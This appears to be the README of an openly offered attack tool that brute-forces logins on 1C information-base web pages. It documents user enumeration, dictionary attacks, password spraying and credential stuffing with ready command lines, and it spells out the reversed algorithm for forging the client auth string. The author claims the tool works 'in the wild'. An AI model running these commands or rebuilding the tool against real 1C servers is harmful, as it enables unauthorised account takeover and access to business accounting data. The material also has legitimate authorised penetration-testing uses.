# wb1c
web bruter for 1c

I reversed javascript from 1c login page. Understood how the algorithm works while generating auth-string before sending on the server.

## What in files?
- 1c_bruter.py - POC written by me, tested and works in the wild
- 1c_bruter.go - Go version with the same functionality

## Requirements

```bash
pip install -r requirements.txt
```

## Help

```
usage: 1c_bruter.py [-h] [-u USER] [-U USERS] [-p PASSWORD] [-P PASSWORDS] [-l] [-o OUTPUT] url

Пентестерский инструмент для перебора учетных данных 1С информационной базы.

positional arguments:
  url           URL 1С информационной базы

options:
  -h, --help    show this help message and exit
  -u USER       Имя пользователя для проверки пароля
  -U USERS      Файл со списком пользователей
  -p PASSWORD   Пароль для перебора
  -P PASSWORDS  Файл со списком паролей
  -l            Получить список пользователей из информационной базы
  -o OUTPUT     Файл для сохранения результатов
```

## Usage Examples

### Recon - get users list

```bash
python 1c_bruter.py -l http://target-server/InfoBase
python 1c_bruter.py -l -o users.txt http://192.168.1.100/accounting
```

### Check specific credentials

```bash
# Check single password for specific user
python 1c_bruter.py -u Administrator -p "Password123" http://target-server/InfoBase

# Check empty password for admin
python 1c_bruter.py -u Administrator -p "" http://192.168.1.100/production
```

### Dictionary attack

```bash
# Single user, multiple passwords
python 1c_bruter.py -u Accountant -P passwords.txt http://target-server/InfoBase

# With saving results
python 1c_bruter.py -u Administrator -P common_passwords.txt -o results.txt http://192.168.1.100/accounting
```

### Password spraying

```bash
# Single password, multiple users
python 1c_bruter.py -U users.txt -p "Spring2024" http://target-server/InfoBase

# Check empty passwords for all users
python 1c_bruter.py -U users.txt -p "" -o empty_passwords.txt http://192.168.1.100/production
```

### Credential stuffing

```bash
# User list + password list
python 1c_bruter.py -U users.txt -P passwords.txt http://target-server/InfoBase

# With saving results
python 1c_bruter.py -U discovered_users.txt -P top1000.txt -o compromised_accounts.txt http://192.168.1.100/accounting
```

## Algorithm
- key1 = `AES256-CBC(data=rand(32 bytes), key=sha256(base64(sha1(password)))`
- key2 = `AES256-CBC(data=rand(32 bytes), key=sha256(base64(sha1(upper(password))))`
- data1 = `bytes(login)`
- payload = `[1, len(key1), key1, len(key2), key2, packed_little-endian(len(data1)), data1]`
- checksum = `crc32(payload)`
- result = `base64(payload + packed_little-endian(checksum))`
